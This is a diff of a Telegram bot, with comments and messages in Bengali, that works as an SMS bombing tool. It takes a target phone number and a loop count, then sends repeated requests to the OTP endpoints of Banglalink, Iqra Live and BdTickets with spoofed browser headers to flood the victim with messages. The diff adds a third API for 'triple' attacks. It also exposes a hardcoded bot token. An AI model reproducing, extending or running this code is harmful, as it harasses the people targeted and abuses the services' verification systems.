@@ -4,33 +4,19 @@ const http = require('http');
 
 // --- কনফিগারেশন ---
 const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
-const channelId = '@srmtelecom'; // আপনার চ্যানেলের ইউজারনেম (@ সহ)
-const channelLink = 'https://t.me/srmtelecom';
+const channelId = '@srmtelecom';
 const bot = new TelegramBot(token, {polling: true});
 const userStates = {};
 
-// Render সচল রাখতে সার্ভার
-http.createServer((req, res) => {
-    res.write("S.R.M TELECOM Force-Join Active!");
-    res.end();
-}).listen(process.env.PORT || 3000);
+// Render সচল রাখতে
+http.createServer((req, res) => { res.write("S.R.M TELECOM BL-Power Active!"); res.end(); }).listen(process.env.PORT || 3000);
 
-console.log("🚀 S.R.M TELECOM (Force Join Mode) চালু হয়েছে...");
+console.log("🚀 S.R.M TELECOM (Triple API Mode) চালু হয়েছে...");
 
-// প্রধান মেনু
-const mainMenu = {
-    reply_markup: {
-        keyboard: [[{ text: '🚀 শুরু করুন (Attack)' }], [{ text: '📢 চ্যানেল জয়েন' }]],
-        resize_keyboard: true
-    }
-};
+const mainMenu = { reply_markup: { keyboard: [[{ text: '🚀 শুরু করুন (Attack)' }], [{ text: '📢 চ্যানেল জয়েন' }]], resize_keyboard: true } };
 
-// চ্যানেল জয়েন চেক করার ফাংশন
 async function isSubscribed(chatId) {
-    try {
-        const res = await bot.getChatMember(channelId, chatId);
-        return ['member', 'administrator', 'creator'].includes(res.status);
-    } catch (e) { return false; }
+    try { const res = await bot.getChatMember(channelId, chatId); return ['member', 'administrator', 'creator'].includes(res.status); } catch (e) { return false; }
 }
 
 bot.on('message', async (msg) => {
@@ -38,57 +24,60 @@ bot.on('message', async (msg) => {
     const text = msg.text;
     if (!text) return;
 
-    // ১. ফোর্স জয়েন চেক (সব কম্যান্ডের জন্য)
     const joined = await isSubscribed(chatId);
     if (!joined && text !== '/start') {
-        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\n\nবটটি ব্যবহার করতে আমাদের অফিশিয়াল চ্যানেলে জয়েন থাকা বাধ্যতামূলক।\n\n📢 লিংক: ${channelLink}\n\nজয়েন করে আবার /start দিন।`, { parse_mode: "Markdown" });
+        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nচ্যানেলে জয়েন করে আবার /start দিন।\n📢 লিংক: https://t.me/srmtelecom`, { parse_mode: "Markdown" });
     }
 
-    // ২. মেনু হ্যান্ডলার
-    if (text === '/start') {
-        bot.sendMessage(chatId, "🔥 **S.R.M TELECOM**\nস্বাগতম! নিচে বাটন চেপে কাজ শুরু করুন।", mainMenu);
-    }
+    if (text === '/start') { bot.sendMessage(chatId, "🔥 **S.R.M TELECOM**\nবাংলালিংক ও অন্যান্য এপিআই এখন সচল।", mainMenu); }
 
     else if (text === '🚀 শুরু করুন (Attack)') {
         userStates[chatId] = { step: 'num' };
-        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
+        bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন:**", { reply_markup: { remove_keyboard: true } });
     }
 
-    else if (text === '📢 চ্যানেল জয়েন') {
-        bot.sendMessage(chatId, `আমাদের অফিশিয়াল চ্যানেল: ${channelLink}`);
+    else if (userStates[chatId]?.step === 'num' && text.length === 11) {
+        userStates[chatId] = { step: 'amount', number: text };
+        bot.sendMessage(chatId, `🔢 **কয়টি SMS লুপ? (১-৩০)**`);
     }
-
-    // ৩. ওটিপি প্রসেস (Dual API)
-    else if (userStates[chatId]?.step === 'num') {
-        if (text.length === 11 && text.startsWith('01')) {
-            userStates[chatId] = { step: 'amount', number: text };
-            bot.sendMessage(chatId, `✅ নম্বর: ${text}\n🔢 **কয়টি SMS লুপ পাঠাতে চান? (১-৫০)**`);
-        } else { bot.sendMessage(chatId, "❌ সঠিক নম্বর দিন।"); }
-    } 
 
     else if (userStates[chatId]?.step === 'amount') {
         const amount = parseInt(text);
-        if (isNaN(amount) || amount <= 0 || amount > 50) return bot.sendMessage(chatId, "⚠️ ১-৫০ এর মধ্যে লিখুন।");
-
+        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি দিন।");
         const target = userStates[chatId].number;
         delete userStates[chatId];
 
-        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে ডাবল পাওয়ার অ্যাটাক শুরু...`);
+        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে ট্রিপল এপিআই অ্যাটাক শুরু...`);
 
         let success = 0;
         for (let i = 0; i < amount; i++) {
-            // API 1: Iqra GET
-            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`, { timeout: 3000 }); success++; } catch (e) {}
-            // API 2: BdTickets POST
+            // ১. Banglalink API (আপনার দেওয়া নতুন POST API)
             try { 
-                await axios.post('https://api.bdtickets.com:20100/v1/auth', { createUserCheck: true, phoneNumber: "+88" + target, applicationChannel: "WEB_APP" }, 
-                { headers: { 'Content-Type': 'application/json', 'Origin': 'https://bdtickets.com', 'Sec-Ch-Ua-Platform': '"Android"' }, timeout: 3000 }); 
+                await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', 
+                { mobile: target }, 
+                { headers: { 
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://www.banglalink.net',
+                    'Referer': 'https://www.banglalink.net/',
+                    'User-Agent': 'Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36'
+                }, timeout: 5000 }); 
                 success++; 
             } catch (e) {}
 
-            await new Promise(r => setTimeout(r, 2000));
-        }
+            // ২. Iqra Live (GET)
+            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`, { timeout: 4000 }); success++; } catch (e) {}
 
+            // ৩. BdTickets (POST)
+            try { 
+                await axios.post('https://api.bdtickets.com:20100/v1/auth', 
+                { createUserCheck: true, phoneNumber: "+88" + target, applicationChannel: "WEB_APP" }, 
+                { headers: { 'Content-Type': 'application/json', 'Origin': 'https://bdtickets.com', 'Sec-Ch-Ua-Platform': '"Android"' }, timeout: 4000 }); 
+                success++; 
+            } catch (e) {}
+
+            // ৪ সেকেন্ড গ্যাপ (সেরা রেজাল্টের জন্য)
+            await new Promise(r => setTimeout(r, 4000));
+        }
         bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}\n📤 সফল হিট: ${success}টি`, mainMenu);
     }
 });
